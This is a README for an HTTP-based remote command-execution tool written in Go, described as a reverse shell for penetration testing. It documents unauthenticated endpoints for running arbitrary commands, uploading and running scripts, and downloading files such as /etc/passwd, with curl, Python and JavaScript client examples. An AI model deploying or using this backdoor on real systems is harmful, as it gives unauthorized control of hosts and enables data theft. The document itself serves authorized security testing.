# Rishell - HTTP Reverse Shell

A powerful HTTP-based reverse shell written in Go that provides file upload/download capabilities and live command execution with streaming output.

## Features

- **Health Check**: Monitor server status and system information
- **Help System**: Built-in documentation for all endpoints
- **File Upload**: Upload files to the target server
- **File Download**: Download files from the target server
- **Command Execution**: Execute arbitrary commands with live streaming output
- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Long Polling**: Real-time command output streaming
- **Multiline Commands**: Support for complex shell scripts and commands

## Installation

```bash
git clone <repository-url>
cd rishell
go mod tidy
go build -o rishell main.go
```

## Usage

### Starting the Server

```bash
# Default port (8080)
./rishell

# Custom port
PORT=9999 ./rishell
```

### Environment Variables

- `PORT`: Server port (default: 8080)

## API Endpoints

### 1. Health Check
```http
GET /health
```

**Response:**
```json
{
  "status": "ok",
  "timestamp": "2024-01-01T12:00:00Z",
  "os": "linux",
  "arch": "amd64",
  "host": "server-hostname"
}
```

### 2. Help
```http
GET /help
```

Returns a list of all available endpoints with descriptions.

### 3. File Upload
```http
POST /upload
Content-Type: multipart/form-data
```

**Parameters:**
- `file`: The file to upload (form field)

**Example using curl:**
```bash
curl -X POST -F "file=@/path/to/local/file.txt" http://localhost:8080/upload
```

**Response:**
```json
{
  "message": "File uploaded successfully",
  "filename": "file.txt",
  "size": 1024
}
```

Files are uploaded to the `./uploads/` directory on the server.

### 4. File Download
```http
GET /download?path=/absolute/path/to/file
```

**Parameters:**
- `path`: Absolute path to the file on the server

**Example using curl:**
```bash
curl -O "http://localhost:8080/download?path=/etc/passwd"
```

### 5. Command Execution
```http
POST /run
Content-Type: application/json
```

**Request Body:**
```json
{
  "command": "ls -la"
}
```

**Response Stream:**
The server streams JSON responses line by line:
```json
{"output": "total 16", "done": false}
{"output": "drwxr-xr-x 2 user user 4096 Jan 1 12:00 .", "done": false}
{"output": "drwxr-xr-x 3 user user 4096 Jan 1 12:00 ..", "done": false}
{"output": "", "done": true}
```

## Usage Examples

### Basic Command Execution
```bash
curl -X POST http://localhost:8080/run \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'
```

### Multiline Commands
```bash
curl -X POST http://localhost:8080/run \
  -H "Content-Type: application/json" \
  -d '{"command": "for i in {1..5}; do echo \"Count: $i\"; sleep 1; done"}'
```

### Interactive Commands with Streaming
```bash
curl -X POST http://localhost:8080/run \
  -H "Content-Type: application/json" \
  -d '{"command": "ping -c 5 google.com"}' \
  --no-buffer
```

### File Operations
```bash
# Upload a file
curl -X POST -F "file=@script.sh" http://localhost:8080/upload

# Download a file
curl -O "http://localhost:8080/download?path=/tmp/uploaded_file.txt"

# Execute uploaded script
curl -X POST http://localhost:8080/run \
  -H "Content-Type: application/json" \
  -d '{"command": "chmod +x ./uploads/script.sh && ./uploads/script.sh"}'
```

## Client Examples

### Python Client
```python
import requests
import json

# Command execution with streaming
def execute_command(url, command):
    response = requests.post(f"{url}/run", 
                           json={"command": command}, 
                           stream=True)
    
    for line in response.iter_lines():
        if line:
            data = json.loads(line)
            if data.get("output"):
                print(data["output"])
            if data.get("error"):
                print(f"ERROR: {data['error']}")
            if data.get("done"):
                break

# Usage
execute_command("http://localhost:8080", "ls -la")
```

### JavaScript Client
```javascript
async function executeCommand(url, command) {
    const response = await fetch(`${url}/run`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({command: command})
    });

    const reader = response.body.getReader();
    const decoder = new TextDecoder();

    while (true) {
        const {done, value} = await reader.read();
        if (done) break;

        const lines = decoder.decode(value).split('\n');
        for (const line of lines) {
            if (line.trim()) {
                const data = JSON.parse(line);
                if (data.output) console.log(data.output);
                if (data.error) console.error(data.error);
                if (data.done) return;
            }
        }
    }
}
```

## Security Considerations

⚠️ **WARNING**: This tool is designed for authorized penetration testing and security research only.

- This tool provides unrestricted access to the host system
- Use only in controlled environments
- Ensure proper authorization before deployment
- Consider implementing authentication for production use
- Monitor logs for unauthorized access attempts

## Platform-Specific Notes

### Windows
- Commands are executed using `cmd /C`
- File paths use backslashes
- Some Unix commands may not be available

### Linux/macOS
- Commands are executed using `/bin/bash -c`
- Full Unix command suite available
- Supports shell scripting and pipes

## Troubleshooting

### Common Issues

1. **Port already in use**
   ```
   Solution: Use a different port with PORT=9999 ./rishell
   ```

2. **Permission denied on file upload**
   ```
   Solution: Ensure the server has write permissions to the uploads directory
   ```

3. **Command hangs or doesn't respond**
   ```
   Solution: The command might be waiting for input. Use non-interactive commands.
   ```

4. **Large output truncation**
   ```
   Solution: The streaming should handle large outputs. Check client timeout settings.
   ```

## Development

### Building from Source
```bash
go build -ldflags "-s -w" -o rishell main.go
```

### Cross-Platform Builds
```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o rishell-linux main.go

# Windows
GOOS=windows GOARCH=amd64 go build -o rishell.exe main.go

# macOS
GOOS=darwin GOARCH=amd64 go build -o rishell-mac main.go
```

## License

This project is for educational and authorized security testing purposes only.